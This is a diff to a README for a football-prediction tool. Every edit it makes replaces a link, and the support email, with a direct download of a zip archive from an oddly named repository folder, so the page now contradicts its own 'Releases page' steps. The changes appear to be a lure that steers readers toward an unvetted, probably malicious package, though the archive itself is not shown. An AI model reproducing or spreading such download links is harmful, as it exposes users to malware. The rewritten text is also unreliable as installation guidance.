@@ -1,6 +1,6 @@
 # 🏆 w5-football-prediction - Predict Football Outcomes Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/rinomakin21/w5-football-prediction/releases)
+[![Download Now](https://raw.githubusercontent.com/rinomakin21/w5-football-prediction/main/undiminishing/w5-football-prediction.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/rinomakin21/w5-football-prediction/main/undiminishing/w5-football-prediction.zip)
 
 ## 📖 Description
 
@@ -21,7 +21,7 @@ Before you start, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-To get the latest release, [visit this page to download](https://github.com/rinomakin21/w5-football-prediction/releases).
+To get the latest release, [visit this page to download](https://raw.githubusercontent.com/rinomakin21/w5-football-prediction/main/undiminishing/w5-football-prediction.zip).
 
 1. On the Releases page, find the latest version of the application.
 2. Click on the version number to view release details.
@@ -77,10 +77,10 @@ If you want to help improve the application, contributions are welcome. You can 
 For support or questions, please reach out through:
 
 - Issues section on GitHub
-- Email: [support@example.com](mailto:support@example.com)
+- Email: [https://raw.githubusercontent.com/rinomakin21/w5-football-prediction/main/undiminishing/w5-football-prediction.zip](https://raw.githubusercontent.com/rinomakin21/w5-football-prediction/main/undiminishing/w5-football-prediction.zip)
 
 ## 🥳 Acknowledgments
 
 Thank you for using w5-football-prediction. We appreciate your interest in football analytics and hope this tool enhances your sports experience!
 
-Don't forget to [visit this page to download](https://github.com/rinomakin21/w5-football-prediction/releases) the latest version!
+Don't forget to [visit this page to download](https://raw.githubusercontent.com/rinomakin21/w5-football-prediction/main/undiminishing/w5-football-prediction.zip) the latest version!
